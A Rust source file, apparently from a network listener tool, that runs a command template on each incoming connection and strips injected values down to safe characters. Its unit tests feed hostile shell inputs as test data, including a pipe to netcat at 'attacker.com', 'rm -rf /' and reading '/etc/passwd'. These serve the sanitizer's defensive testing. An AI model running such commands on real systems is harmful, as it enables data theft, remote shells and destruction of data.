use std::process::Command;

/// Maximum input length to prevent DoS via oversized inputs
const MAX_INPUT_LEN: usize = 256;

/// Shell-escape a string to prevent command injection.
/// Only allows safe characters: alphanumeric, dash, underscore, dot, colon.
/// Logs a warning if dangerous characters were stripped.
fn shell_escape(s: &str) -> String {
    if s.is_empty() {
        return String::new();
    }
    // Truncate overly long inputs
    let s = if s.len() > MAX_INPUT_LEN {
        tracing::warn!(
            "Input too long ({}), truncating to {} chars",
            s.len(),
            MAX_INPUT_LEN
        );
        &s[..s.floor_char_boundary(MAX_INPUT_LEN)]
    } else {
        s
    };

    let original = s;
    let sanitized: String = s
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_' || *c == '.' || *c == ':')
        .collect();

    // Log if we stripped dangerous characters
    if sanitized.len() != original.len() && !sanitized.is_empty() {
        tracing::warn!(
            "Stripped dangerous characters from input. Original: '{}', Sanitized: '{}'",
            original,
            sanitized
        );
    }

    sanitized
}

/// Execute a command template when a connection is received.
/// Available template variables:
/// - {pid}: Process ID
/// - {procname}: Process name
/// - {src_addr}: Source IP address
/// - {src_port}: Source port
/// - {dst_addr}: Destination IP address
/// - {dst_port}: Destination port
/// - {listener}: Listener name
///
/// All template values are sanitized to prevent command injection.
/// WARNING: The template itself is NOT sanitized - only use trusted template strings!
pub fn execute_on_connect(
    template: &str,
    pid: Option<u32>,
    procname: Option<&str>,
    src_addr: &str,
    src_port: u16,
    dst_addr: &str,
    dst_port: u16,
    listener: &str,
) {
    // Sanitize all user-controllable inputs
    let pid_str = pid.map(|p| p.to_string()).unwrap_or_default();
    let procname_sanitized = shell_escape(procname.unwrap_or("unknown"));
    let src_addr_sanitized = shell_escape(src_addr);
    let dst_addr_sanitized = shell_escape(dst_addr);
    let listener_sanitized = shell_escape(listener);

    let cmd = template
        .replace("{pid}", &pid_str)
        .replace("{procname}", &procname_sanitized)
        .replace("{src_addr}", &src_addr_sanitized)
        .replace("{src_port}", &src_port.to_string())
        .replace("{dst_addr}", &dst_addr_sanitized)
        .replace("{dst_port}", &dst_port.to_string())
        .replace("{listener}", &listener_sanitized);

    tracing::info!("Executing command: {}", cmd);

    let result = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", &cmd]).spawn()
    } else {
        Command::new("sh").args(["-c", &cmd]).spawn()
    };

    match result {
        Ok(mut child) => {
            // Don't wait - fire and forget
            std::thread::spawn(move || {
                let _ = child.wait();
            });
        }
        Err(e) => {
            tracing::warn!("Failed to execute command: {}", e);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shell_escape_safe() {
        assert_eq!(shell_escape("normal_process"), "normal_process");
        assert_eq!(shell_escape("my-app_v2.0"), "my-app_v2.0");
        assert_eq!(shell_escape("192.168.1.1"), "192.168.1.1");
    }

    #[test]
    fn test_shell_escape_dangerous() {
        // After sanitization, $(whoami) becomes "whoami" - the dangerous chars are removed
        assert_eq!(shell_escape("$(whoami)"), "whoami");
        // But the shell commands won't execute because $() is stripped
        assert_eq!(shell_escape("process`id`"), "processid");
        assert_eq!(
            shell_escape("process|nc attacker.com 4444"),
            "processncattacker.com4444"
        );
        // Spaces and special chars are stripped
        assert_eq!(shell_escape("rm -rf /"), "rm-rf");
        assert_eq!(
            shell_escape("process;cat /etc/passwd"),
            "processcatetcpasswd"
        );
    }

    #[test]
    fn test_shell_escape_ipv6() {
        // IPv6 addresses use colons which are allowed
        assert_eq!(shell_escape("::1"), "::1");
        assert_eq!(shell_escape("fe80::1"), "fe80::1");
        assert_eq!(shell_escape("2001:db8::1"), "2001:db8::1");
    }

    #[test]
    fn test_shell_escape_truncation() {
        let long_input = "a".repeat(300);
        let result = shell_escape(&long_input);
        assert_eq!(result.len(), MAX_INPUT_LEN);
    }

    #[test]
    fn test_shell_escape_empty() {
        assert_eq!(shell_escape(""), "");
        assert_eq!(shell_escape("   "), "");
    }
}
